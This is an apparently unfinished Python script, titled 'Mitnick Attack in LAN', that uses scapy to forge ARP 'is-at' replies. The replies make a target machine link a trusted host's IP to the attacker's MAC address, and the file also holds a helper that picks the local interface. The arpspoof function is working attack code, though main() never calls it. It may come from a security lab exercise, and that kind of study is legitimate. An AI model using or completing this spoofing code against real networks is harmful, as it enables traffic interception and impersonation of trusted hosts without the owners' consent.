"""Mitnick Attack in LAN."""
import argparse
import sys
from socket import AddressFamily

import psutil
import scapy.all as sc
from scapy.layers import l2


def get_mac_by_iprange(target_ip: str) -> tuple | None:
    """Get the MAC address from the interface matching the target IP."""
    net_ifs = psutil.net_if_addrs()
    interface = None

    for ifname in net_ifs.keys():
        for addr in net_ifs[ifname]:
            if addr.family == AddressFamily.AF_INET:
                if addr.address.split('.')[:2] == target_ip.split('.')[:2]:
                    interface = ifname
                    break
        if interface is not None:
            break

    if interface is None:
        return None

    for addr in net_ifs[interface]:
        if addr.family == AddressFamily.AF_PACKET:
            return interface, addr.address

    return None


def arpspoof(mac_addr: str, target_ip: str, target_mac: str,
             trusted_ip: str) -> None:
    """Run the ARP Spoofing."""
    a = l2.ARP()
    a.op = 'is-at'

    # Target
    a.pdst = target_ip
    a.hwdst = target_mac

    # Trusted IP
    a.psrc = trusted_ip

    # Own MAC address
    a.hwsrc = mac_addr

    a.show()
    sc.send(a)

    return


def main(target_ip: str, trusted_ip: str) -> None:
    """Run the Mitnick Attack."""
    print(f'Target IP: {target_ip}')
    print(f'Trusted IP: {trusted_ip}')

    res = get_mac_by_iprange(target_ip)

    if res is None:
        print('Error: could not get ifname & MAC address using the target IP')
        sys.exit(1)

    interface, mac_addr = res

    print(f'Interface identified: {interface}')
    print(f'MAC Address: {mac_addr}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ARP Spoofing')

    parser.add_argument('--target_ip',
                        type=str,
                        required=True,
                        help='Target IP')

    parser.add_argument('--trusted_ip',
                        type=str,
                        required=True,
                        help='Trusted IP')

    args = parser.parse_args()

    main(args.target_ip, args.trusted_ip)
